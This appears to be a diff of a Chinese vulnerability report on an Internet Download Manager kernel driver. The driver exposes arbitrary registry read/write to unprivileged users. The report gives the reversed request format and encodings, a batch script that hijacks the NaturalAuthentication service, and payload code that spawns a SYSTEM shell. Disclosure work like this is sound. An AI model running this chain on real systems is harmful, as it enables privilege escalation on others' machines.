@@ -1,472 +1,394 @@
-# Internet Download Manager `idmwfp.sys` 任意注册表读写导致本地提权漏洞
+# Internet Download Manager `idmwfp.sys` 内核注册表操作原语本地提权漏洞
+
+| 项目 | 内容 |
+| --- | --- |
+| 漏洞编号 | CVE-2026-90493 (CNA: VulDB) |
+| 联系方式 | kncrjvirx@gmail.com |
+| 厂商 | Tonec Inc. / Internet Download Manager Corp. |
+| 受影响产品 | Internet Download Manager **≤ 6.42 Build 63**（Windows） |
+| 受影响组件 | `idmwfp.sys`（Internet Download Manager WFP Driver），Windows 内核驱动 |
+| 设备接口 | `\\.\IDMWFP` |
+| 漏洞类型 | 内核驱动访问控制缺失 / 暴露的 IOCTL 未做调用者鉴权（CWE-266、CWE-284） |
+| 攻击向量 | 本地，低权限已认证用户，无需交互 |
+| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`，8.8 |
+| CVSS v4.0 | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P`，8.5 |
+
+---
 
 ## 1. 摘要
 
-`idmwfp.sys` 暴露了一个面向所有认证用户可访问的设备接口 `\\.\IDMWFP`。  
-通过该接口的 `IOCTL 0x12C028` 及其子命令 `0x0C..0x0F`，低权限本地用户可以在**没有任何授权校验**的情况下，对 `HKLM` 和 `HKU` 下**任意路径**的注册表值执行：
+`idmwfp.sys` 在初始化时用 `WdmlibIoCreateDeviceSecure` 创建设备对象 `\Device\IDMWFP`，并把安全描述符字符串 `D:P(A;;GA;;;AU)` 一并交给该例程。`AU` 是 Authenticated Users，`GA` 是 GENERIC_ALL。于是本机任何一个已认证用户都能以完全访问权限打开 `\\.\IDMWFP`，向它发送任意 `DeviceIoControl` 请求。
 
-- 读取
-- 创建/修改
-- 删除值
-- 删除空 key
+设备本身的权限过宽只提供了入口。真正的问题在主控制面的 `IRP_MJ_DEVICE_CONTROL` 处理例程 `sub_14000E9E0` 里：`IOCTL 0x12C028` 按请求包首字节分发子命令，其中 `0x0C`–`0x0F` 四个子命令全部进入同一个处理函数 `sub_140005B90`，而该函数在解析完用户输入之后，直接以驱动自身（内核）身份调用 `ZwOpenKey` / `ZwCreateKey` / `ZwQueryValueKey`、运行时解析的 `ZwSetValueKey`、`ZwDeleteValueKey`、`ZwDeleteKey`。
 
-这不是仅限于 IDM 自身命名空间的配置接口，而是一个由内核驱动代理执行的、面向任意认证用户开放的注册表操作原语。  
-由于该原语可以修改：
+这条路径上没有任何鉴权：
 
-- `HKLM\\SYSTEM\\CurrentControlSet\\Services\\...`
-- 其他被高权限服务、计划任务或系统组件信任的注册表路径
+- 没有检查调用者是谁，`IoGetRequestorProcessId` 在整个驱动里只被 `0x12C00C` 用来给 PID 策略对象打标记，注册表子命令一次都没调用它；
+- 没有任何路径白名单，调用者提交的相对路径被原样拼接在 `\REGISTRY\MACHINE\` 或 `\REGISTRY\USER\` 之后；
+- 没有冒充调用者线程（未调用 `SeAccessCheck` / `PsImpersonateClient` / `ZwAccessCheckAndAuditAlarm`），因此注册表对象的 ACL 根本不参与判定。
 
-因此该问题可被用于：
+结果是：一个普通本地用户可以通过这个驱动，对 `HKLM` 与 `HKU` 下任意路径的注册表值执行读取、创建、修改、删除，从而实现本地权限提升（详见第5节）。
 
-- 本地权限提升（LPE）
-- 以 `SYSTEM` 或内核上下文执行攻击者控制的代码/配置
-- 高权限持久化
-- 安全产品/系统配置篡改
-
-从安全影响上看，这应当被视为一个**高危的内核驱动逻辑漏洞**，本质上属于“面向低权限用户暴露的任意受信任注册表读写能力”。
+厂商未发布安全公告。IDM 6.43 系列的 `idmwfp64.sys` 6.43.1.91 中已出现命名空间白名单，`HKLM\SYSTEM\CurrentControlSet\Services\...` 这类路径不再被接受，属于静默修复。
 
 ---
 
-## 2. 厂商与受影响组件
+## 2. 披露时间线
 
-- 厂商：Tonec / Internet Download Manager
-- 受影响组件：`idmwfp.sys`
-- 组件类型：Windows 内核驱动
-- 设备接口：`\\.\IDMWFP`
+| 日期 | 事件 |
+| --- | --- |
+| 2026-05-01 | 发现漏洞 |
+| 2026-05-06 | 尝试联系厂商，邮件发送至 `support@internetdownloadmanager.com` 与 `support@tonec.com`，未收到任何回应 |
+| 2026-07-15 | 公开 PoC 与完整技术报告（当前仓库），并向 VulDB 提交 |
+| 2026-09-13 | 分配编号 CVE-2026-90493 |
 
-已分析样本：
-
-- MD5: `7d55ad6b428320f191ed8529701ac2fa`
-- SHA-256: `753a1386e7b37ee313db908183afe7238f1a2aec5e6c1e59e9c11d471b6aaa8d`
-
----
-
-## 3. 漏洞类型与评级建议
-
-### 3.1 漏洞类型
-
-- 本地权限提升（Local Privilege Escalation）
-- 任意受信任注册表读写（Arbitrary Registry Read/Write/Delete）
-- 内核驱动授权缺失 / 不安全设备访问控制
-
-### 3.2 根因分类
-
-建议 CWE：
-
-- `CWE-862` Missing Authorization
-- `CWE-732` Incorrect Permission Assignment for Critical Resource
-
-### 3.3 建议 CVSS v3.1
-
-建议初始评分：
-
-- `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
-- 分值：`7.8`
-
-说明：
-
-- 攻击向量为本地
-- 仅需普通低权限认证用户权限
-- 不需要用户交互
-- 可读取和修改高价值系统注册表路径
-- 可导致高完整性破坏与持久化
-
-如果厂商或评估方接受“通过篡改服务/驱动配置可稳定获得 `SYSTEM`/内核执行”这一利用链，则风险表述应进一步强调其实际 LPE 性质。
+从首次联系厂商到 PoC 公开间隔 70 天，其间我方未收到厂商的任何回复，也未观察到厂商发布安全公告。厂商侧的修复以 6.43 系列驱动中的命名空间白名单形式静默落地，公开更新日志中没有任何一条提及驱动安全问题。
 
 ---
 
-## 4. 受影响前提
+## 3. 影响范围
 
-攻击者仅需：
+### 3.1 受影响版本
 
-- 本地认证用户权限
-- 能够打开 `\\.\IDMWFP`
+- 受影响范围：Internet Download Manager **6.42 Build 63 及之前的所有版本**
+- 已确认存在漏洞的样本：`idmwfp.sys` 6.41.23.87（产品版本 6.41.23.1），随 Internet Download Manager 6.42 Build 63 分发。
+- 已确认不再复现：`idmwfp64.sys` 6.43.1.91（产品版本 6.43.1.1），SHA-256 `8acffb0181146e96c44a94c5b364d657b775936ebb4d0fcce591068f74803c4a`，随 Internet Download Manager 6.43 Build 5 分发。该版本的注册表处理函数改为在操作前解码一段特权策略块，并对路径做允许/拒绝模式匹配（详见第 7 节）。
+- 修复自 6.43 系列引入。厂商在同一时期把驱动文件名从 `idmwfp.sys` 改为 `idmwfp64.sys`，版本号跳到 6.43.x。
 
-不需要：
+### 3.2 攻击面存在的前提
 
-- 管理员权限
-- `SeRestorePrivilege` / `SeLoadDriverPrivilege`
-- 调试权限
-- 交互式用户确认
+三个条件同时成立时攻击面存在：
 
----
-
-## 5. 漏洞根因
-
-### 5.1 设备对象对所有认证用户开放
-
-在 `DriverEntry` 中，驱动创建：
-
-- `\Device\IDMWFP`
-- `\DosDevices\IDMWFP`
-
-并使用安全描述符：
-
-- `D:P(A;;GA;;;AU)`
-
-其效果是：
-
-- 所有认证用户（`AU`）拥有 `GENERIC_ALL`
-
-这意味着任意普通本地用户都可以对该设备发送 `DeviceIoControl` 请求。
-
-### 5.2 没有对目标注册表路径做授权边界限制
-
-主控制面 `IRP_MJ_DEVICE_CONTROL` 分发函数为：
-
-- `sub_14000E9E0`
-
-其中：
-
-- `IOCTL 0x12C028`
-  - 首字节为子命令号
-  - `0x0C..0x0F` 全部进入 `sub_140005B90`
-
-`sub_140005B90` 会：
-
-1. 从用户输入中解出“注册表相对路径 + value 名称”
-2. 根据 `flags` 低位选择根前缀：
-   - `flags & 0x1` -> `\\REGISTRY\\MACHINE\\`
-   - `flags & 0x2` -> `\\REGISTRY\\USER\\`
-3. 调用内核注册表 API：
-   - `ZwOpenKey`
-   - `ZwCreateKey`
-   - `ZwDeleteValueKey`
-   - `ZwDeleteKey`
-   - `ZwQueryValueKey`
-   - `ZwSetValueKey`
-
-关键问题在于：
-
-- 驱动**没有**限制路径必须位于 IDM 私有命名空间下
-- 驱动**没有**校验调用者是否应有权限访问目标 key
-- 驱动**没有**将操作限定到当前用户自己的 HKCU 映射
-
-因此，该接口本质上允许普通用户通过内核驱动代理，对：
-
-- `HKLM\...`
-- `HKU\...`
-
-执行任意路径级别的注册表读写删。
+1. 装有 Internet Download Manager。`idmwfp.sys` 不是可选组件，常规安装会把它放到 `%SystemRoot%\System32\drivers\`，并注册同名内核服务 `IDMWFP` 由服务控制管理器加载。
+2. `IDMWFP` 服务处于运行状态。默认配置下自动运行。IDM 主程序是否打开与攻击面无关，驱动由 SCM 加载。
+3. 本机存在任意一个普通本地账号且攻击者已控制。
 
 ---
 
-## 6. 技术细节
+## 4. 根因分析
 
-### 6.1 相关 IOCTL
+### 4.1 设备对象对所有已认证用户开放
 
-主命令：
+`DriverEntry@0x14000DC10` 中的相关代码：
 
-- `0x12C028`
+```c
+RtlInitUnicodeString(&DestinationString, L"\\Device\\IDMWFP");
+RtlInitUnicodeString(&SymbolicLinkName, L"D:P(A;;GA;;;AU)");
+Version = WdmlibIoCreateDeviceSecure(
+            DriverObject,
+            0,
+            &DestinationString,
+            0x12u,          // DeviceType = FILE_DEVICE_NETWORK
+            0x100u,         // FILE_DEVICE_SECURE_OPEN
+            0,
+            &SymbolicLinkName,   // SDDL
+            &DeviceClassGuid,
+            &DeviceObject);
+...
+RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\IDMWFP");
+IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
+```
 
-其中与本漏洞直接相关的子命令：
+SDDL `D:P(A;;GA;;;AU)` 只有一条 ACE：受托人 `AU`（Authenticated Users），掩码 `GA`（GENERIC_ALL），无继承标志。用户态 `CreateFileW(L"\\\\.\\IDMWFP", GENERIC_READ | GENERIC_WRITE, ...)` 因此对任何已登录用户都返回成功句柄。
 
-- `0x0C`：查询 value
-- `0x0D`：创建缺失 key 并设置 value
-- `0x0E`：删除 value
-- `0x0F`：删除 value，并在 key 为空时删除 key
+### 4.2 主控制面与子命令分发
 
-### 6.2 公共输入结构
+`DriverObject->MajorFunction[14]`（`IRP_MJ_DEVICE_CONTROL`）指向 `sub_14000E9E0`。该例程从 `IO_STACK_LOCATION` 取出 `Parameters.DeviceIoControl.IoControlCode`、`InputBufferLength`、`OutputBufferLength`，输入输出缓冲区共用 `Irp->AssociatedIrp.SystemBuffer`（METHOD_BUFFERED）。
 
-这 4 个子命令共用一套输入格式：
+已确认的 IOCTL：
+
+| IOCTL | 入口 | 作用 |
+| --- | --- | --- |
+| `0x12C004` | 内联 | 查询指定 PID 的策略摘要 |
+| `0x12C008` | `sub_140014330` | 建立/更新指定 PID 的策略与 TLV 规则 |
+| `0x12C00C` | `sub_1400140E0` | 为指定 PID 绑定事件对象与重定向端口 |
+| `0x12C010` | `sub_140013EB0` | 弹出指定 PID 的通知队列消息 |
+| `0x12C014` / `0x12C018` | `sub_140015F90` | 活动流控制包装（opcode `0x80` / `0x81`） |
+| `0x12C01C` | `sub_140014650` | 更新 PID 策略的扩展字段 |
+| `0x12C020` | `sub_140015F90` | 活动流控制（调用者指定 opcode） |
+| `0x12C024` | `sub_140010230` | 按端口对反查 PID |
+| `0x12C028` | 子命令分发 | 注册表 / 文件 / WFP 辅助操作 |
+
+`0x12C028` 的分发把请求首字节减去 9 作为跳转索引（`add eax, 0FFFFFFF7h; cmp eax, 7; ja default`），有效子命令为 `9`–`0x10`：
+
+| 子命令 | 入口 | 作用 |
+| --- | --- | --- |
+| `9` | `sub_140005610` | 固定操作 `\SystemRoot\System32\drivers\etc\hosts` |
+| `0x0A` | `sub_140003DA0` | 按条件值批量删除 WFP filter |
+| `0x0B` | `sub_140005A40` | 删除固定路径下四个固定值（硬编码 IDM 许可信息） |
+| **`0x0C`–`0x0F`** | **`sub_140005B90`** | **调用者指定路径的注册表读/写/删** |
+| `0x10` | `sub_140006490` | 卷信息摘要查询 |
+
+`sub_14000E9E0` 对每条子命令只做长度校验，随后直接调用处理函数，不做任何身份检查。
+
+值得单独指出的是 `0x0B`：它要访问的正是 IDM 自己的命名空间 `\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\Internet Download Manager`，路径与值名都硬编码在驱动里，用同一个 `D:P(A;;GA;;;AU)` 设备和同一套内联解码逻辑完成。这说明 IDM 完全有能力把注册表操作限制在自己的命名空间内，`0x0C`–`0x0F` 接受任意路径是一个独立的设计选择，并非能力所限。
+
+### 4.3 缺失鉴权的注册表处理函数
+
+`sub_140005B90(PRIV_CMD *input, ULONG input_len, ULONG output_len, ULONG *out_len)` 的入口检查只有三项：`input->mode <= 1`、`KeGetCurrentIrql() == 0`、根前缀字符串尚未解码时先做一次 XOR/ROL 常数解码。全部与调用者身份无关。
+
+函数随后完成以下工作：
+
+1. 读取 `path_offset`、`path_wchars`，校验 `path_wchars >= 0xA` 且 `input_len >= path_offset + 2 * path_wchars`；
+2. 就地对这段 UTF-16 做逐字符解码；
+3. 从后向前查找最后一个反斜杠，把字符串切成"相对键路径"和"值名"；如果值名恰好是单个 `@`，则改写为 `L'\0'`，即把操作目标指向键的默认值；
+4. 按 `flags` 低位选择根前缀，把根前缀、键路径、终止符依次写入 UNICODE_STRING 缓冲区，值名通过 `ValueName.Buffer` 单独携带；
+5. 进入 `switch (子命令)`，调用内核注册表 API。
+
+第 4 步的根前缀是两条同样以 `(w ^ 0xDAAD) + 9555`、`ROR 16, (4+i) & 0xF` 编码的宽字符串，逐字解码结果为：
+
+```text
+xmmword_1400244D8 -> "\REGISTRY\MACHINE\"
+xmmword_1400244B8 -> "\REGISTRY\USER\"
+```
+
+两个前缀的控制流是互斥的：`flags & 1` 走 MACHINE，否则只有 `flags & 2` 才走 USER，两者都不带时直接返回 `STATUS_INVALID_PARAMETER`。
+
+四个子命令的注册表调用如下（偏移以 `PRIV_CMD` 起点计，`+0x0C` 是 data 区在包内的偏移、`+0x0E` 是 data 区的字节数）：
+
+| 子命令 | 内核调用 | 权限 | 说明 |
+| --- | --- | --- | --- |
+| `0x0C` | `ZwOpenKey(KEY_QUERY_VALUE)` → `ZwQueryValueKey(KeyValuePartialInformation)` | 只读 | 输出缓冲区至少 16 字节；结果直接回写到同一个 SystemBuffer，前 4 字节被覆盖为返回长度 |
+| `0x0D` | `ZwCreateKey(KEY_SET_VALUE)`（必要时逐级创建）→ `ZwSetValueKey` | 读写 | 先校验 `input_len >= data_offset + data_size`，随后解码数据区并写入 |
+| `0x0E` | `ZwOpenKey(KEY_SET_VALUE)` → `ZwDeleteValueKey` | 写 | 值不存在（`STATUS_OBJECT_NAME_NOT_FOUND`）被视作成功 |
+| `0x0F` | `ZwOpenKey(KEY_QUERY_VALUE \| DELETE)` → `ZwDeleteValueKey` → `ZwQueryKey(KeyFullInformation)` → `ZwDeleteKey` | 删 | 仅当键下子键数与值数均为 0 时才删键，否则返回 `STATUS_KEY_HAS_CHILDREN` |
+
+`0x0D` 的逐级创建逻辑值得一提：它先用完整路径调用 `ZwCreateKey`，返回 `STATUS_OBJECT_NAME_NOT_FOUND` 时通过 `sub_140019C00`（在缓冲区里向前查找最后一个反斜杠）截断一级再试，直到成功；成功后再用 `sub_140019B70`（从指定偏移向后查找反斜杠）逐级把路径补全，每一级都单独 `ZwCreateKey`。因此多级不存在的键路径可以一次调用建成。
+
+三处细节共同说明"鉴权被完全省略"：
+
+- 全程没有调用 `IoGetRequestorProcessId`。该 API 在驱动里唯一的调用点在 `0x12C00C` 的处理路径（`0x14000EB65`），用途是把调用者 PID 写进策略对象，与注册表路径无关。
+- 全程没有冒充调用者线程，也没有显式调用 `SeAccessCheck` 一类的访问检查。注册表操作在驱动自身的安全上下文里执行，被访问对象的 ACL 不参与判定。
+- 路径拼接没有做任何字符过滤，`..`、`\`、`.` 全部原样进入对象管理器路径。
+
+### 4.4 请求包与私有编码
+
+`0x0C`–`0x0F` 共用同一个 20 字节头部，随后是路径区与数据区。以下结构按 IDA 中的字段命名整理，字段偏移与驱动读取位置一致：
 
 ```c
 #pragma pack(push, 1)
-typedef struct IDMWFP_REG_CMD {
-    uint8_t  subcmd;        // 0x0C / 0x0D / 0x0E / 0x0F
-    uint8_t  mode;
-    uint16_t reserved0;
-    uint32_t flags;         // bit0 = HKLM, bit1 = HKU
-    uint16_t path_offset;   // 指向“加密 UTF-16 路径”
-    uint16_t path_wchars;   // 路径字符数
-    uint16_t data_offset;   // 0x0D 使用
-    uint16_t data_size;     // 0x0D 使用
-    uint16_t value_type;    // 0x0D / 0x0C 使用
-    uint8_t  seed0;
-    uint8_t  seed1;
-    // followed by:
-    //   encoded_utf16_path[path_wchars]
-    //   encoded_or_raw_data[data_size]
-} IDMWFP_REG_CMD;
+typedef struct PRIV_CMD {
+    uint8_t  subcmd;        // +0x00  0x0C / 0x0D / 0x0E / 0x0F
+    uint8_t  mode;          // +0x01  必须 <= 1
+    uint16_t reserved0;     // +0x02
+    uint32_t flags;         // +0x04  bit0 = MACHINE 根, bit1 = USER 根, bit8..11 = 数据编码选项
+    uint16_t path_offset;   // +0x08  路径区在包内的字节偏移
+    uint16_t path_wchars;   // +0x0A  路径区的 UTF-16 字符数，须 >= 10
+    uint16_t data_offset;   // +0x0C  数据区在包内的字节偏移
+    uint16_t data_size;     // +0x0E  数据区字节数
+    uint16_t value_type;    // +0x10  REG_SZ / REG_DWORD / ...
+    uint8_t  seed0;         // +0x12  数据编码种子，0 时按 0xAD 处理
+    uint8_t  seed1;         // +0x13  数据编码种子，0 时按 0xAD 处理
+    /* +0x14: encoded_utf16_path[path_wchars] */
+    /* 之后:   encoded_data[data_size]                */
+} PRIV_CMD;
 #pragma pack(pop)
 ```
 
-路径字符串在驱动内会被解码，并在最后一个 `\` 处分割为：
+攻击者可控的字段覆盖了注册表根（`flags` 低位）、相对键路径、值名、值类型、值内容以及编码参数。驱动只负责解码与转发。
 
-- `key path`
-- `value name`
+接口使用两套私有编码，逆向成本有，但不构成安全边界：
 
-因此，攻击者完全控制：
+**路径区**，按字符下标 `i` 从 0 开始，`rot = (4 + i) & 0xF`：
 
-- 注册表根（HKLM / HKU）
-- 相对 key 路径
-- value 名称
-- value 类型
-- value 内容
-
-### 6.3 已动态验证的行为
-
-我已使用自写的 PoC 工具成功验证：
-
-1. `0x0D` 在 `HKLM\SOFTWARE\IDMWFPProbe2\Val` 下写入 `REG_DWORD`
-2. `0x0C` 读取该 value 并回显正确内容
-3. `0x0E` 删除该 value
-4. `0x0F` 删除空 key
-5. `0x0D` 写入 `REG_EXPAND_SZ`
-6. `0x0C` 成功读取并恢复字符串内容
-
-这说明：
-
-- 该接口不是理论上的“可能写”
-- 而是已经实证可稳定用于**通用注册表操作**
-
----
-
-## 7. 影响分析
-
-### 7.1 任意 `HKLM` 写入
-
-对低权限用户而言，最危险的是任意 `HKLM` 写入。
-
-这允许攻击者篡改：
-
-- `HKLM\SYSTEM\CurrentControlSet\Services\...`
-- 各类高权限服务/驱动配置
-- 高权限程序的启动参数、路径、依赖项、DLL 路径
-- 安全产品、防护组件、系统策略相关键值
-
-### 7.2 任意 `HKU` 访问
-
-通过 `HKU\...` 根前缀，攻击者还可以：
-
-- 读写其他用户 SID hive 下的配置
-- 篡改跨用户环境中的登录后行为
-- 建立更隐蔽的持久化
-
-### 7.3 导致 LPE 的原因
-
-该问题之所以不仅是“任意注册表写”，而是实质上的 LPE 风险，在于：
-
-- 注册表是 Windows 高权限组件的核心配置来源
-- 一旦低权限用户能改写高权限服务/驱动所信任的注册表项，就可以把自己控制的路径、参数或 DLL 注入到高权限执行链中
-
-典型场景包括但不限于：
-
-- 修改现有服务的 `ImagePath`
-- 修改服务加载的 DLL/参数路径
-- 修改驱动服务配置，等待系统重启或服务重启
-- 篡改被 `SYSTEM` 或高完整性进程读取的关键配置项
-
-即便在某个具体环境中，攻击者还需要“重启服务/等待系统重启/触发高权限组件读取配置”，这依然属于标准的本地提权利用链。
-
-换句话说：
-
-- 漏洞本体提供的是**高权限注册表原语**
-- LPE 则是该原语的直接安全后果
-
----
-
-## 8. 利用场景
-
-### 场景 A：高权限服务配置篡改
-
-普通用户可改写：
-
-- `HKLM\SYSTEM\CurrentControlSet\Services\<Target>\ImagePath`
-
-一旦目标服务后续被高权限上下文启动，即可能获得高权限代码执行。
-
-### 场景 B：驱动服务路径篡改
-
-普通用户可改写：
-
-- 驱动服务的 `ImagePath`
-
-在后续重启或重新加载时，可导向攻击者控制的二进制路径。
-
-### 场景 C：安全配置破坏与高权限持久化
-
-攻击者可通过修改：
-
-- 安全产品配置
-- 服务参数
-- 系统组件配置
-
-获得长效持久化或降低系统防护。
-
----
-
-## 9. 复现步骤
-
-### 9.1 环境
-
-- Windows 系统
-- `idmwfp.sys` 已加载
-- 普通本地认证用户
-
-### 9.2 最小 PoC：任意 `HKLM` 写入
-
-使用我编写的工具：
-
-- `idmwfp_reg_demo.exe`
-
-写入 `REG_DWORD`：
-
-```powershell
-.\idmwfp_reg_demo.exe set-dword machine "SOFTWARE\IDMWFPProbe2\Val" 0x11223344
+```c
+decoded = ROR16((encoded ^ 0xDAAD) + 9555, rot);
 ```
 
-读取：
+**数据区**，按字节下标 `i` 从 0 开始，`rot = (4 + i) & 7`：
 
-```powershell
-.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPProbe2\Val" 64
+```c
+decoded = ROR8((encoded ^ 0xAD) + 83, rot);
 ```
 
-工具输出应包含：
+当 `flags & 0xF00` 非零时，`0x0D` 的写入路径与 `0x0C` 的查询路径会在此基础上再叠加一轮变换，分支条件取决于 `value_type`：
+
+- `value_type ∈ {1, 2, 7}`（`REG_SZ` / `REG_EXPAND_SZ` / `REG_MULTI_SZ`）且 `flags & 0x600` 非零时，按 UTF-16 单位处理；其中 `flags & 0x400` 会再走一遍以 wchar 为单位的 Fisher-Yates 式置换（`sub_140005430`），随后必定再走一遍按字符的 `decoded = seed ^ (encoded - seed)` 变换（`sub_140005300`）；
+- 其他类型且 `flags & 0x100` 非零时，走以 32 位为单位的置换（`sub_140005260`）。
+
+`seed0` / `seed1` 分别作为这两条分支的种子参与运算，为 0 时按 `0xAD` 处理。默认情况下（仅带根选择位）这两轮变换不生效，普通 `REG_DWORD` / `REG_SZ` 读写只需要上面两条基础编解码。
+
+`0x0C` 的输出是原生的 `KEY_VALUE_PARTIAL_INFORMATION`，前 12 字节为 `TitleIndex` / `Type` / `DataLength`，紧随其后的是经过同一套字节变换编码的数据。`METHOD_BUFFERED` 下输入输出共用同一个 SystemBuffer，驱动把返回长度写到 `+0x00..0x03`，即覆盖了调用者请求包的头部；`+0x04` 起的 `flags` 字段及包头之后的路径区、数据区不受影响。缓冲区不足时驱动返回 `STATUS_BUFFER_OVERFLOW` 或 `STATUS_BUFFER_TOO_SMALL`，回写位置相同。
+
+---
+
+## 5. PoC
+
+### 5.1 攻击链概览
 
 ```text
-decoded: title_index=16 type=4 data_len=4
-value(dword)=0x11223344
+普通本地用户 (Medium IL)
+   └─ poc.bat
+        ├─ [1] idmwfp_reg_demo.exe query          读回原始 ImagePath
+        ├─ [2] idmwfp_reg_demo.exe set-expand-string  ImagePath  -> payload
+        ├─ [3] idmwfp_reg_demo.exe set-dword          Start     -> 0x2  (自动)
+        ├─ [4] idmwfp_reg_demo.exe set-dword          Type      -> 0x10 (独立进程)
+        ├─ [5] idmwfp_reg_demo.exe set-multi-string   RequiredPrivileges -> 28 项
+        ├─ [6] idmwfp_reg_demo.exe query          确认 ImagePath 已被改写
+        └─ [7] sc start NaturalAuthentication
+                 └─ SCM 以 LocalSystem 身份启动 payload
+                      └─ StartProcessAsSystemInActiveSession() -> SYSTEM 交互式 cmd.exe
 ```
 
-### 9.3 写入 `REG_EXPAND_SZ`
+第 2 至第 5 步全部通过 `\\.\IDMWFP` 完成，攻击者不需要对该服务键有写权限。
 
-```powershell
-.\idmwfp_reg_demo.exe set-expand-string machine "SOFTWARE\IDMWFPRegDemo\Path" "\SystemRoot\System32\drivers\Test.sys"
+### 5.2 改写服务注册表项
+
+`poc.bat` ：
+
+```bat
+set base=%~dp0
+set file=%base%payload.exe
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Type" 0x10
+.\idmwfp_reg_demo.exe set-multi-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\RequiredPrivileges" "SeTcbPrivilege|SeChangeNotifyPrivilege|..."
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+sc start NaturalAuthentication
+pause
 ```
 
-读取：
+### 5.3 为什么选中 NaturalAuthentication
 
-```powershell
-.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPRegDemo\Path" 256
-```
-
-工具输出应包含：
+选择目标服务需要两个条件同时成立，`NaturalAuthentication` 恰好都满足。
 
 ```text
-type=2
-value(expand_sz)=\SystemRoot\System32\drivers\Test.sys
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NaturalAuthentication]
+"DisplayName"        = "@%systemroot%\system32\NaturalAuth.dll,-100"
+"ImagePath"          = hex(2): "%SystemRoot%\system32\svchost.exe -k netsvcs -p"
+"ObjectName"         = "LocalSystem"
+"RequiredPrivileges" = hex(7): SeTcbPrivilege
+                               SeChangeNotifyPrivilege
+                               SeSystemEnvironmentPrivilege
+"Start"              = dword:00000003   (SERVICE_DEMAND_START)
+"Type"               = dword:00000020   (SERVICE_WIN32_SHARE_PROCESS)
+"DependOnService"    = hex(7): RpcSs, ProfSvc, Schedule
 ```
 
-### 9.4 删除 value 与 key
+**条件一，服务身份为 LocalSystem。** `ObjectName = LocalSystem`，服务本体以内核级身份运行，改掉入口即等于以 SYSTEM 执行载荷。
+
+**条件二，普通用户有权启动该服务。** 大多数身份为 LocalSystem 的服务不能由普通用户手动启动。
+
+### 5.4 取得 SYSTEM Shell
+
+载荷是一个标准 Windows 服务程序，服务名硬编码为 `NaturalAuthentication`：
+
+```cpp
+constexpr char kServiceName[] = "NaturalAuthentication";
+
+void WINAPI ServiceMain(DWORD, LPSTR*) {
+    g_status_handle = RegisterServiceCtrlHandlerA(kServiceName, ServiceControlHandler);
+    ...
+    session0_launcher::StartProcessAsSystemInActiveSession(
+        L"C:\\Windows\\system32\\cmd.exe",
+        L"cmd.exe"
+    );
+    ...
+}
+
+int main(int argc, char* argv[]) {
+    SERVICE_TABLE_ENTRYA service_table[] = {
+        {const_cast<LPSTR>(kServiceName), ServiceMain},
+        {nullptr, nullptr},
+    };
+    if (!StartServiceCtrlDispatcherA(service_table)) { ... }
+}
+```
+
+服务名必须与被劫持的服务一致，否则 SCM 与进程之间的 `StartServiceCtrlDispatcher` 握手会失败。
+
+最后一步是跨会话启动。服务由 SCM 在会话 0 启动，即使令牌是 SYSTEM，进程也处在一个没有交互桌面的会话里。 `StartProcessAsSystemInActiveSession` 完成以下动作：
+
+1. `WTSEnumerateSessionsW` 枚举会话，取第一个 `WTSActive` 的会话 ID，失败时回退到 `WTSGetActiveConsoleSessionId`；
+2. `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE)`，并用 `EqualSid` 校验当前令牌的用户 SID 确实是 `S-1-5-18`，否则直接失败；
+3. `DuplicateTokenEx(..., TokenPrimary)` 复制出主令牌；
+4. `SetTokenInformation(TokenSessionId)` 把令牌的会话 ID 改为当前活动交互会话；
+5. `CreateEnvironmentBlock` + `CreateProcessAsUserW(..., lpDesktop = L"winsta0\\default", ...)` 在交互桌面上拉起 `cmd.exe`。
+
+### 5.5 使用与善后
+
+环境准备与执行：
 
 ```powershell
-.\idmwfp_reg_demo.exe del-value machine "SOFTWARE\IDMWFPProbe2\Val"
-.\idmwfp_reg_demo.exe del-key machine "SOFTWARE\IDMWFPProbe2\Val"
+# 1. 安装 IDM（本目录中的官方安装包）
+.\poc\idman642build63.exe
+
+# 2. 确认驱动已由 SCM 加载
+sc.exe query IDMWFP
+
+# 3. 以普通用户身份执行整条链
+cd .\poc
+.\poc.bat
 ```
 
-这证明：
-
-- 普通用户不仅能写，还能清理或破坏关键配置路径
-
-### 9.5 高危路径示例
-
-例如攻击者可尝试写入：
+`poc.bat` 提交的四个值在服务器上都可以用同一条原语还原。`backup.reg` 提供了完整的原始配置，双击导入即可，或在管理员环境下执行：
 
 ```powershell
-.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\<Target>\ImagePath" "\SystemRoot\System32\drivers\Attacker.sys"
+sc.exe stop NaturalAuthentication
+reg.exe import .\poc\backup.reg
 ```
 
-这类路径位于：
+---
 
-- `HKLM\SYSTEM\CurrentControlSet\Services\...`
+## 6. 影响
 
-明显超出了 IDM 合法配置范围。
+| 维度 | 评估 |
+| --- | --- |
+| 机密性 | 高。可读取 `HKLM` / `HKU` 任意路径的注册表值，包括其它用户 hive 与安全组件配置 |
+| 完整性 | 高。可创建、修改、删除任意注册表值，并可删除空键 |
+| 可用性 | 高。可删除受保护配置、破坏服务定义，导致系统组件无法启动 |
+| 权限提升 | 是。普通本地用户可达 LocalSystem |
+| 持久化 | 是。可直接改写服务、驱动、自启动项定义 |
+| 用户交互 | 不需要 |
